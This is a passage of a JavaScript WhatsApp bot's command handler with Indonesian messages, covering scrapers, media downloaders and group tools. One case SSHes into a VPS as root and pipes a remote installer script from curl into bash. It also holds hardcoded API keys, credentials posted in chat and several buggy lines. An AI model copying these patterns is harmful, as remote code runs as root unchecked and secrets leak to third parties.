 const url = `https://www.thefreedictionary.com/${encodeURIComponent(text)}`;
// wm avs
 try {
 const response = await axios.get(url);
 const $ = cheerio.load(response.data);
 let definitions = [];
// wm avs
 $('.ds-list').each((i, elem) => {
 definitions.push($(elem).text().trim());
 });
// wm avs
 if (definitions.length === 0) {
 return m.reply('Kata tidak Ada.');
 }
// wm avs
 let result = `*${text}*:\n`;
 definitions.forEach((def, index) => {
 result += `${index + 1}. ${def}\n`;
 });
// wm avs
 conn.sendMessage(m.chat, { text: result }, { quoted: m });
 } catch (error) {
 m.reply('Terjadi kesalahan lagi.');
 }
}
break

case 'merriam': {
 if (!text) return m.reply('contoh nya : merriam house');
 const axios = require('axios');
 const cheerio = require('cheerio');
// wm avs
 const url = `https://www.merriam-webster.com/dictionary/${encodeURIComponent(text)}`;
// wm avs
 try {
 const response = await axios.get(url);
 const $ = cheerio.load(response.data);
 let definitions = [];

 $('.dtText').each((i, elem) => {
 definitions.push($(elem).text().trim());
 });

 if (definitions.length === 0) {
 return m.reply('Kata tidak ditemukan dalam Merriam.');
 }
// wm avs
 let result = `Makna dari *${text}*:\n`;
 definitions.forEach((def, index) => {
 result += `${index + 1}. ${def}\n`;
 });
// wm avs
 conn.sendMessage(m.chat, { text: result }, { quoted: m });
 } catch (error) {
 m.reply('Terjadi kesalahan.');
 }
}
break

case 'volvid': {
 const { TelegraPh } = require('./lib/uploader');
 const ffmpeg = require('fluent-ffmpeg');
 const fs = require('fs');
 
 const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? sky.user.jid : m.sender;
 const q = m.quoted ? m.quoted : m;
 const mime = (q.msg || q).mimetype || '';
 
 if (!mime || !mime.includes('video')) return m.reply(`Mana videonya?`);
 
 const volume = parseFloat(args[0]) || 1;
 if (isNaN(volume) || volume <= 0) return m.reply('Tentukan volume yang valid (contoh: 0.5 untuk setengah, 2 untuk dua kali lipat)');
 
 m.reply(mess.wait);
 
 try {
 const media = await conn.downloadAndSaveMediaMessage(q);
 const output = 'output.mp4';
 
 ffmpeg(media)
 .audioFilters(`volume=${volume}`)
 .on('start', (commandLine) => {
 console.log(`Spawned Ffmpeg with command: ${commandLine}`);
 })
 .on('error', async (err) => {
 console.error(`Error: ${err.message}`);
 await fs.promises.unlink(media).catch(console.error);
 return m.reply(`Error: ${err.message}`);
 })
 .on('end', async () => {
 console.log('Video processed');
 
 try {
 const url = await TelegraPh(output);
 await fs.promises.unlink(output);
 await fs.promises.unlink(media);
 
 conn.sendMessage(m.chat, { caption: `_Success To Change Video Volume_`, video: { url } }, { quoted: m });
 } catch (err) {
 console.error(`Eror Pas Upload Vid Nya: ${err.message}`);
 await fs.promises.unlink(media).catch(console.error);
 return m.reply(`Eror Pas Upload Vid Nya: ${err.message}`);
 }
 })
 .save(output);
 } catch (err) {
 console.error(`Eror Pas Proses Vid Nya: ${err.message}`);
 return m.reply(`Eror Pas Proses Vid Nya: ${err.message}`);
 }
}
break

case 'news-game': {
 const axios = require('axios');
 const cheerio = require('cheerio');
// wm avs
 const url = 'https://www.gamespot.com/news/';
// wm avs
 try {
 const response = await axios.get(url);
 const $ = cheerio.load(response.data);
 let news = [];
// wm avs
 $('.media-title').each((i, elem) => {
 news.push($(elem).text().trim());
 });
// wm avs
 if (news.length === 0) {
 return m.reply('Tidak ada Game Terbaru.');
 }
// wm avs
 let result = `News Game In 2024\n`;
 news.slice(0, 5).forEach((headline, index) => {
 result += `${index + 1}. ${headline}\n`;
 });
// wm avs
 conn.sendMessage(m.chat, { text: result }, { quoted: m });
 } catch (error) {
 m.reply('ad error.');
 }
}
break
case 'group': case 'gc': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isCreator) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!q) return reply(`Send command ${command} _options_\nOptions : close & open\nExample : ${command} close`)
if (args[0] == 'close') {
 reply(`*₊˚🗝 ࣪𓂃˚☽ ｡⋆ . . . 「 _it's time_ ${botname} close the Group_ 〞*

 ♡゙. . .trimakasii yang suda berbicara dan mengobrol di group hari nii ,semoga rejekinya lancar selaluu, dan jangan lupa istirahat ya jgn main hp Mulu 😘✨˚☽˚｡⋆
 ━ ━༝ ₊˚good night everyone sleep wellﾟ｡𓊇
· · • • • 🪷 • • • ·`)
conn.groupSettingUpdate(from, 'announcement')
} else if (args[0] == 'open') {
 reply(`*₊˚🗝 ࣪𓂃˚☽ ｡⋆ . . . 「 _hello everyone ,it's time to open_ 〞*

 ♡゙. . .ayoo berbicara dan mengobrol bersama ok😉🥰, Ramaikan group ini🤩✨
ketik *.menuall* untuk melihat list menu˚☽˚｡⋆
 ━ ━༝ ₊˚ saluran : ${saluran} ﾟ｡𓊇
· · • • • 🪷 • • • ·`)
conn.groupSettingUpdate(from, 'not_announcement')
} else {
let msg = generateWAMessageFromContent(from, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: botname
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 ...(await prepareWAMessageMedia({ image: { url: './database/image/add.jpg' } }, { upload: conn.waUploadToServer })),
 title: ``,
 gifPlayback: true,
 subtitle: ownername,
 hasMediaAttachment: false
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: `{
 "title":"PILIH BUKA/TUTUP ♨️",
 "sections":[{
 "title":"PILIH BUKA/TUTUP ",
 "rows":[{
 "header":"BUKA ✅",
 "title":"MEMILIH ",
 "description":"BUKA✅",
 "id":"${prefix + command} open"
 },
 {
 "header":"TUTUP ❌",
 "title":"MEMILIH ",
 "description":"TUTUP ❌",
 "id":"${prefix + command} close"
 }]
 }]
 }`
 }
 ]
 }),
 contextInfo: {
 mentionedJid: [m.sender],
 forwardingScore: 999,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363310531380313@newsletter',
 newsletterName: ownername,
 serverMessageId: 143
 }
 }
 })
 }
 }
}, { quoted: m });

await conn.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
});
}}
break

case 'twt': case 'twitterdl':
case 'twitter': {
 function delay(ms) {
 return new Promise(resolve => setTimeout(resolve, ms));
}
if (!text) return reply('Linknya mana, bro..');
try {
 reply(mess.wait);
const response = await fetch(`https://skizo.tech/api/twitter?apikey=woxxzAsia&url=${encodeURIComponent(text)}`);
const data = await response.json();
for (let ii = 0; ii < data.media.length; ii++) {
 const caption = ii === 0 ? data.authorName : '';
 const url = data.media[ii].url;
 const type = data.media[ii].type.includes('video') ? 'video' : 'image';
 await conn.sendMessage(m.chat, {
 [type]: {
 url: url,
 },
 caption,
 }, {
 quoted: m,
 });
 await delay(1500);
}
} catch (e) {
 console.error(e);
 reply('Server error!');
 return e.toString();
}
}
break

case 'aio': {
if (!text) return reply('Masukkan link nya!')
await loading()
reply(mess.wait)

try {
 let gtAu = (await axios.post("https://api.cobalt.tools/api/json", {"url": text,}, {headers: {"Content-Type": "application/json", Accept: "application/json"}})).data
 await conn.sendMessage(from, {video: {url: gtAu.url}, caption: `Done!`}, {quoted: m})
} catch (e) {
 reply('Tidak dapat mendownload video')
}

try {
 let gtAu = (await axios.post("https://api.cobalt.tools/api/json", {"url": text,"isAudioOnly":"true"}, {headers: {"Content-Type": "application/json", Accept: "application/json"}})).data
 await conn.sendMessage(from, {audio: {url: gtAu.url}, mimetype: 'audio/mp4', ptt: false}, {quoted: m})
} catch (e) {
 reply('Tidak dapat mendownload audio')
}

}
break

case 'kbbi': case 'kbbi-kemdikbud': {
 if (!text) return m.reply('contoh kbbi-kemdikbud')
 const axios = require('axios')
 const url = `https://kbbi.kemdikbud.go.id/entri/${encodeURIComponent(text)}`
 // wm avs
 axios.get(url).then(response => {
 const cheerio = require('cheerio')
 const $ = cheerio.load(response.data)
 let definition = $('ol').first().text().trim()
 // wm avs 
 if (!definition) {
 return m.reply('Kata tidak ditemukan dalam KBBI.')
 }
 // wm avs 
 conn.sendMessage(m.chat, { text: `${definition}` }, { quoted: m })
 }).catch(error => {
 m.reply('Terjadi elol.')
 })
}
break

case 'ngelink': case "ngl": {
if (!text.split("|")[0] && !text.split("|")[1]) return m.reply("Masukan username dan pesannya!\nContoh: .ngl mannr|haloo")
try {
let x = text.split("|")
var { data } = await require("axios")({
 "method": "GET",
 "url": "https://manaxu-seven.vercel.app/api/tools/ngl?username=" + x[0] + "&message=" + x[1]
})
reply("Sukses mengirim ngl ke " + x[0])
} catch (e) {
return m.reply("fitur error")
}
}
break
case 'slap': case 'sleep': case 'smile': case 'smug': case 'stare': case 'think': case 'thumbsup': case 'tickle': case 'wave': case 'wink': case 'yawn': case 'yeet': {
 if (isBan) return m.reply(mess.ban)
 reply(mess.wait)
 let wet = await (await fetch(`https://nekos.best/api/v2/${command}`)).json();
 let stkk = wet.results[0];
 conn.sendImageAsSticker(from, stkk.url, m, { packname: global.packname, author: global.author })
 okk()
 reply(`🎇 *ANIME CHARAKTER:* ${stkk.anime_name}`)
}
break

case "play5": {
if (!text) return m.reply("Masukan query!")
try {
let m = await require("axios")({
 "method": "GET",
 "url": "https://manaxu-seven.vercel.app/api/internet/youtube?query=" + text
})
let { youtubeUrl } = m.data.result[Math.floor(Math.random() * m.data.result.length)]
let { data } = await require("axios")({
 "method": "GET",
 "url": "https://api.shannmoderz.xyz/downloader/yt-audio?url=" + youtubeUrl
})
conn.sendMessage(m.chat, { audio: { url: data.result.download_url }, mimetype: "audio/mp4" }, { quoted: m })
} catch (e) {
return m.reply("fitur error")
console.log(e)
}
}
break

case 'coco': case 'cocofun':{
 if (!text) return m.reply('• *Example :* .cocofun https://cocofun.com/xxxx')
//tanakaganteng
 conn.sendMessage(m.chat, { react: { text: "🕒", key: m.key } });
//tanakasenn
 let kampang = await fetch(`https://api.lolhuman.xyz/api/cocofun?apikey=${apikeys}&url=${text}`)
 let res = await kampang.json()
//tanakasenn
 let juucpstr = `Title: ${res.result.title}\nTag: ${res.result.tag}\nLike: ${res.result.likes}\nViews: ${res.result.views}\nUploader: ${res.result.uploader}\nDuration: ${res.result.duration}`
conn.sendMessage(m.chat, { video: { url: res.result.nowm }, caption: juucpstr }, { quoted: m })
 }
 break

/*case 'cekdo': case 'scando':
if (!text) return m.reply("Masukan query!")
try {
var { data } = await require("axios").get("https://manaxu-seven.vercel.app/api/tools/scanner?url=" + text)
let v = "*S C A N N E R D O M A I N*\n--------------------------------------------------"
for (let x of data.result) {
 v += `\n*issuer_ca_id:* ${x.issuer_ca_id}`
 v += `\n*issuer_name:* ${x.issuer_name}`
 v += `\n*common_name:* ${x.common_name}`
 v += `\n*name_value:* ${x.name_value}`
 v += `\n*id:* ${x.id}`
 v += `\n*entry_timestamp:* ${x.entry_timestamp}`
 v += `\n*not_before:* ${x.not_before}`
 v += `\n*not_after:* ${x.not_after}`
 v += `\n*serial_number:* ${x.serial_number}`
 v += `\n*result_count:* ${x.result_count}`
 v += `\n--------------------------------------------------\n`
m.reply(v)
} catch (e) {
return m.reply("fitur eror")
    }
    }
break*/


case 'removebg':
 if (isBan) return m.reply(mess.ban)
 if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *reply/kirim gambar dengan caption .removebg*`)
 if (!/image/.test(mime)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Kirim/Reply Gambar Dengan Caption .removebg*`)
 if (/image/.test(mime)) {
reply(mess.wait)
 let mee = await conn.downloadAndSaveMediaMessage(quoted)
 const TelegraPH = require('./lib/upload')
 let mem = await TelegraPH(mee)
 let shannz = await (await fetch(`https://api.shannmoderz.xyz/tools/removebg?url=${mem}`)).json()
 let bg = conn.result.image
 conn.sendMessage(m.chat,{image:{url: bg }, caption: '*SUCCESS* ✅'},{quoted: m})
}
break

case 'robomaker': { 
 if (!q) return m.reply(`contoh \nRobomaker Avosky\n\n! Ini Bukan Membuat Robot Tapi menghasilkan robot dari nama doang`);
 async function roboMaker(text) {
 try {
 const imageUrl = `https://robohash.org/${q}`;
 return imageUrl;
 } catch (err) {
 return null;
 }
 }
//avosky
 const result = await roboMaker(q);
 if (result) {
 const message = {
 image: { url: result },
 caption: 'Random Robot'
 };
 conn.sendMessage(m.chat, message);
 } else {
 m.reply('err.');
 }
}
break

case 'catsay': {
 if (!q) return m.reply(`contoh \n\ncatsay avosky`);
//avosky 
 async function CatSayAvs(text) {
 try {
 const imageUrl = `https://cataas.com/cat/says/${q}`;
 return imageUrl;
 } catch (err) {
 return null;
 }
 }
 const result = await CatSayAvs(q);
 if (result) {
 const message = {
 image: { url: result },
 caption: 'miawwwwvwwswwkwwy'
 };
 conn.sendMessage(m.chat, message);
 } else {
 m.reply('err.');
 }
}
break

case 'picsum': {
 if (!text) return m.reply(`contoh \n\npicsum nature`) 
 async function picSumAvz(text) {
 try {
 const imageUrl = `https://picsum.photos/seed/${q}/800/600`;
 return imageUrl;
 } catch (err) {
 return null;
 }
 }
//avs
 const result = await picSumAvz(q);
 if (result) {
 const message = {
 image: { url: result },
 caption: `hasil dari pencarian gambar : ${q}`
 };
 conn.sendMessage(m.chat, message);
 } else {
 m.reply('err.');
 }
}
break

case 'photoleap': {
 if (!q) return m.reply(`contoh \n\nphotoleAp girl crying`);
 async function textToImageVsky(text) {
 try {
 const { data } = await axios.get("https://tti.photoleapapp.com/api/v1/generate?prompt=" + encodeURIComponent(text));
 return data;
 } catch (err) {
 return null;
 }
 }
//avosky
 const result = await textToImageVsky(text);
//avosky
 if (result && result.result_url) {
 const imageUrl = result.result_url;
 const message = {
 image: { url: imageUrl },
 caption: 'done nih'
 };
 conn.sendMessage(m.chat, message);
 } else {
 m.reply('err.');
 }
}
break

case 'dall': case 'downloadall': {
 let url = args[0]
 if (!url) {
 await conn.sendMessage(m.chat, { text: `[!] *wrong input*\n> Ex: ${usedPrefix + command} url\n\nSupport: YT, TT, IG, FB` }, { quoted: m })
 return
 }
 let type

 if (url.includes('youtube.com')) {
 type = 'YT'
 } else if (url.includes('vt.tiktok.com')) {
 type = 'TT'
 } else if (url.includes('instagram.com')) {
 type = 'IG'
 } else if (url.includes('facebook.com')) {
 type = 'FB'
 } else { 
 return
 }

 try {
 let response = await axios.get(`https://vkrdownloader.vercel.app/server?vkr=${url}`)
 let data = response.data.data

 let message = `Title: ${data.title}\nSource: ${data.source}`
 await conn.sendMessage(m.chat, { text: `Please wait...\nType ${type}` }, { quoted: m })
 let downloads = data.downloads.map(d => d.url)
 for (let downloadUrl of downloads) {
 await conn.sendMessage(m.chat, { video: { url: downloadUrl }, caption: data.title }, { quoted: m })
 }
 } catch (e) { 
 console.error(e) 
 }
}
break

case 'wikipedia': {
 if (!text) return m.reply('mau searching apa?')
 let api = await (await fetch('https://api.shannmoderz.xyz/berita/wikipedia?query=' + text)).json()
 if (api.status && api.code === 200 && api.result && api.result.results) {
 let allText = api.result.results.map(item => 
 `*${item.title}*\n${item.extract}`
 ).join('\n\n\n');
 let availableImages = api.result.results
 .filter(item => item.thumbnail)
 .map(item => item.thumbnail);
 let randomImage = availableImages.length > 0 
 ? availableImages[Math.floor(Math.random() * availableImages.length)]
 : 'https://telegra.ph/file/dda0b1de238cee3556023.jpg'; 
 
 conn.sendMessage(m.chat, { image: { url: randomImage }, caption: `Hasil pencarian untuk "${api.result.search_term}":\n\n${allText}` }, { quoted: m });
 } else {
 return m.reply('Maaf, tidak dapat menemukan hasil untuk pencarian tersebut.')
 }
}
break

case 'git2': case 'github':
 if (!text) return m.reply('masukkan url repository github')
 try {
 let git = await (await fetch('https://api.shannmoderz.xyz/downloader/github?url=' + text)).json()
 let shannz = git.result
 await conn.sendMessage(m.chat,{ document: { url: shannz.zipUrl }, caption: `name: ${shannz.name}\nstars: ${shannz.stars}\ncreate at: ${shannz.createdAt}`, fileName: Shannz.name + '.zip', mimetype: 'application/zip' },{ quoted: m })
} catch (error) {
 return m.reply('shannz rest api sedang error' + error)
}
break

case 'longtext':{
let lana = await fetchJson('https://raw.githubusercontent.com/Lanaxdev/hehehe/main/gaktau/longtext.json')
let lan = lana[Math.floor(Math.random() * lana.length)];
conn.sendMessage(m.chat,{text: lan},{quoted: m})
}
break

case "clogo": {
 if (!text) throw 'Please provide the text you want to create a logo with. Example: .createlogo YourTextHere';
 
 reply('Generating your logo, please wait...');

 try {
 const url = `https://flamingtext.com/net-fu/proxy_form.cgi?script=fluffy-logo&text=${encodeURIComponent(text)}&imageoutput=true&output=direct&doScale=true&scaleWidth=676&scaleHeight=359`;

 const response = await fetch(url);
 
 if (!response.ok) throw new m.reply('Failed to generate logo');
 
 const imageBuffer = await response.buffer();
 
 await conn.sendFile(m.chat, imageBuffer, 'logo.png', `Here is your logo with the text: ${text}`, m);
 } catch (e) {
 console.error(e);
 m.reply('Sorry, an error occurred while generating the logo.');
 }
}
break

case 'spotify2':
 if (!text) return m.reply('mau cari lagu apa?');
 try {
 let spo = await (await fetch('https://api.shannmoderz.xyz/search/spotify?query=' + text)).json();
 if (spo.status) {
 let results = spo.result;
 let responseMessage = results.map(track => {
 return `*Title:* ${track.name}\n*Artist(s):* ${track.artists}\n*Popularity:* ${track.popularity}\n*Link:* ${track.link}\n*Duration:* ${Math.floor(track.duration_ms / 60000)}:${((track.duration_ms % 60000) / 1000).toFixed(0).padStart(2, '0')}\n*Image:* ${track.image}\n\n`;
 }).join(''); reply(responseMessage); 
 } else {
 m.reply('No results found.');
 }
 } catch (e) {
 m.reply('shannz rest api sedang erorr: ' + e);
 }
 break

case 'spotifydl':
 if (!text) return m.reply('masukkan url music nya!')
 try { 
 m.reply('*Process sending audio, please wait...*')
 let sdl = await (await fetch('https://api.shannmoderz.xyz/downloader/spotify?url=' + text)).json()
 let shannz = sdl.result;
 conn.sendMessage(m.chat,{ audio: { url: shannz.music }, mimetype: 'audio/mp4' }, { quoted: m })
} catch (e) {
 m.reply('shannz rest api sedang erorr' + e);
}
break

/*case 'cekcase': {
if (!isCreator) return reply(mess.owner);
if (!text) return m.reply(`Contoh: ${prefix+command} caseName`);
const caseName = text.trim();
if (!caseName) return m.reply(`Masukkan nama case yang ingin dicek. Contoh: ${prefix+command} caseName`);
const cekCase = async (caseName) => {
try {
const fileContent = await fs.promises.readFile("./main.js", "utf-8");
const caseRegex = new RegExp(`case '${caseName}'[\\s\\S]*?break`, 'g');
const match = fileContent.match(caseRegex);
if (!match) {
return { found: false };
}
const lines = fileContent.split('\n');
const caseLines = match[0].split('\n');
const startLine = lines.indexOf(caseLines[0]) + 1;
const endLine = startLine + caseLines.length - 1;
return {
found: true,
startLine,
endLine,
content: match[0]
};
} catch (error) {
return { error: `Terjadi kesalahan saat membaca file: ${error.message}` };
}};
const result = await cekCase(caseName);
if (result.error) {
m.reply(result.error);
} else if (result.found) {
const message = `
*CASE DITEMUKAN!*
• Nama Case: ${caseName}
• Baris Awal: ${result.startLine}
• Baris Akhir: ${result.endLine}

Mau sekalian di ambil?`;
let kon = `{\"display_text\":\"YA\",\"id\":\"${prefix}getcase 1 ${text}\"}`
conn.sendMessage(m.chat, message, kon, m)
userSessions[m.sender] = { caseToRetrieve: result, caseName };
} else {
m.reply(`Case '${caseName}' tidak ditemukan.`);
}
    }
break*/


case 'installpanelv2':{
if (!isCreator) return ('Maaf Hanya Untuk Dich')
let t = text.split(',');
if (t.length < 3) return m.reply(`*Format salah!*\nPenggunaan: ${prefix}installpanel ipvps,password,domain`)
let ipvps = t[0];
let passwd = t[1];
let subdomain = t[2];
const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
};
let password = generateRandomPassword()

const command = 'bash <(curl -s https://pterodactyl-installer.se)';

const conn = new Client();
let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi
conn.on('ready', () => {
 m.reply('*PROSES PENGINSTALLAN PANEL SEDANG BERLANGSUNG MOHON TUNGGU 5-10MENIT*')
 conn.exec(command, (err, stream) => {
 if (err) throw err;
 stream.on('close', (code, signal) => {
 console.log('Stream closed with code ' + code + ' and signal ' + signal);
 conn.end();
 }).on('data', (data) => {
 if (data.toString().includes('Input')) {
 stream.write('0\n');
 }

 if (data.toString().includes('Input')) {
 stream.write('\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('ruztanxd\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('Asia/Jakarta\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('xerojva@gmail.com\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('xerojva@gmail.com\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('ruztanxd\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('adm\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('adm\n');
 }
 if (data.toString().includes('Input')) {
 stream.write(`${password}\n`);
 }
 if (data.toString().includes('Input')) {
 stream.write(`${subdomain}\n`);
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('yes\n');
 }
 
 if (data.toString().includes('Please read the Terms of Service')) {
 stream.write('A\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('1\n');
 }
 console.log('STDOUT: ' + data);
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
}).connect(connSettings);
await new Promise(resolve => setTimeout(resolve, 600000));
if (isSuccess) {
 m.reply('`SUKSES INSTALL PANEL & WINGS DATA AKAN DI KIRIM BENTAR LAGI`');
 }
 let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: false, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363310531380313@newsletter',
 serverMessageId: -1
 },
 businessMessageForwardInfo: { businessOwnerJid: conn.decodeJid(conn.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: `*DATA PANEL ANDA*\n\n*USERNAME:* ruztanxd\n*PASSWORD:* ${password}\n*LOGIN:* ${subdomain}\n\nNote: *JANGAN LUPA CREATE MANUAL NODE NYA OM HBS ITU GET APIKEY NYA TRUS KETIL .installwings*`
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"ruztanxd\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password}\"}`
},
 {
 "name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Panel\",\"url\":\"https://${subdomain}\",\"merchant_url\":\"https://www.google.com\"}`
 }
 
 ]
 })
 })
 }
 }
 }, {})

 await conn.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
 });
 }
 
 break

case 'ig2':
case 'igdl':
case 'instagram': {
if (!text) return m.reply(`Contoh: ${prefix+command} linknya`)
if (!text.includes('instagram.com')) return m.reply('Harus berupa link instagram!')
conn.sendMessage(m.chat, { react: { text: `🔎`, key: m.key }})
try { 
let jor = await fetchJson(`https://skizo.tech/api/ig?apikey=woxxzAsia&url=${text}`)
return await conn.sendMessage(m.chat, { video: { url: jor.media }, caption: `© ${global.botname}` }, { quoted: m })
} catch (err) {
console.error('Kesalahan pada API skizo.tech:', err)
try {
let { igdown } = require('./lib/scraper')
let anu = await igdown(text)
let c = 0
for (let gom of anu.data) {
if (gom.type === 'video') return await conn.sendMessage(m.chat, { video: { url: gom.url }, caption: `© ${wm}` }, { quoted: m })
if (gom.type === 'image') {
if (c === 0) await conn.sendMessage(m.chat, { image: { url: gom.url }, caption: `© ${botname}\n\n${m.isGroup ? 'Sisa foto dikirim di privat chat' : ""}` }, { quoted: m })
else await conn.sendMessage(m.sender, { image: { url: gom.url }}, { quoted: m })
c += 1
await sleep(2000)
}
}
} catch (err) {
console.error('Kesalahan pada igdown:', err)
try {
let anu = await fetchJson(`https://aemt.me/download/igdl?url=${text}`)
return await conn.sendMessage(m.chat, { video: { url: anu.result[0].url }, caption: `© ${botname}` }, { quoted: m })
} catch (err) {
console.error('Kesalahan pada API aemt.me:', err)
m.reply('Terjadi kesalahan')
}}
}}
break

case'ig3': {
 if (!m.isGroup) return reply(`Maaf Kak Fitur Ini Khusus Untuk Di dalam group, Anda bisa join ke group bot
https://chat.whatsapp.com/IjIKrz71wmY8E7WIxmnkpe`)
 if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
 let ig = await fetchJson(`https://skizo.tech/api/instagram?apikey=woxxzAsia&query=$text}`)
 let url = ig.result.media
 if (!url.length == 1) {
 if (m.isGroup) {
 ig.result.media.forEach(async (k) => {
 await conn.sendMessage(m.sender, {
 image: {
 url: k
 }
 }, {
 quoted: m
 });
 })

 m.reply(`All photos have been sent to your private chat`)
 } else {
 ig.result.media.forEach(async (k) => {
 await conn.sendMessage(from, {
 image: {
 url: k
 }
 }, {
 quoted: m
 });
 })
 }
 } else {
 conn.sendMessage(m.chat, {
 video: {
 url: ig.result.media[0]
 },
 caption: mess.done },
 { quoted: m })
 }
 }
 break

case 'ig4': {
	 if (!text) return reply(`Anda perlu memberikan URL video, postingan, reel, gambar Instagram apa pun`)
 let res
 try {
 res = await fetch(`https://www.guruapi.tech/api/igdlv1?url=${text}`)
 } catch (error) {
 return reply(`An error occurred: ${error.message}`)
 }
 let api_response = await res.json()
 if (!api_response || !api_response.data) {
 return reply(`No video or image found or Invalid response from API.`)
 }
 const mediaArray = api_response.data;
 for (const mediaData of mediaArray) {
 const mediaType = mediaData.type
 const mediaURL = mediaData.url_download
 let cap = `HERE IS THE ${mediaType.toUpperCase()}`
 if (mediaType === 'video') {
 conn.sendMessage(m.chat, {video: {url: mediaURL}, caption: cap}, {quoted: m})
 } else if (mediaType === 'image') {
 conn.sendMessage(m.chat, { image: {url: mediaURL}, caption: cap}, {quoted: m})
 }
 }
}
break

case "ig5":{
 try{
 if (!q) return reply(`Linknya?\nContoh: ${prefix + command} https://www.instagram.com/p/CKXZ1Z1JZK/`)
 await loading()
 let res = await fetchJson (`https://skizo.tech/api/instagram?url=${q}&apikey=woxxzAsia`)
 for (let i of res.media) {
 await sleep (20)
 conn.sendFile(m.chat, i,'ig.mp4', `*INSTAGRAM DOWNLOADER*\n\n${res.caption}`, m)
 } 
 } catch (e) {
 m.reply(mess.error)
 }
 }
 break

case 'linkgc2':
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.group)
reply(mess.wait)
try {
 let response = await conn.groupInviteCode(m.chat);
 let code = `https://chat.whatsapp.com/${response}`;
 let capt = `👥 *GROUP LINK INFO*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Group Owner :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n👥 *Member :* ${groupMetadata.participants.length}`;

 let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: ``
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: capt
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 subtitle: "link group",
 hasMediaAttachment: false
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
 "name": "cta_copy",
 "buttonParamsJson": `{ "display_text": "Copy Link ⸙", "id": "123456789", "copy_code": "${code}" }`
 },
 ],
 })
 })
 }
 }
 }, { quoted: m });

 await conn.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
 });

 } catch (error) {
 console.error(error);
 }
break

case 'scbot': case "script": 
case "scriptbot": {

if (isCreator) {
m.reply("Memproses Pengambilan Scriptbot")
let a = getTime().split("T")[1].split("+")[0]
var name = `ᴢʏ𝙱𝚘𝚝𝚉⚡`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await conn.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, 
mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Scriptbot Berhasil Dikirim Ke Chat Pribadi")
} else {
let teks = `*# Script ᴢʏ𝙱𝚘𝚝𝚉*

Script Bot Ini Tidak Di Bagikan Secara *Gratis!!*

Jika Anda Berminat Ingin Membeli Script Ini, Silahkan Chat *Ownerbot* Dengan Cara Ketik *.owner*`
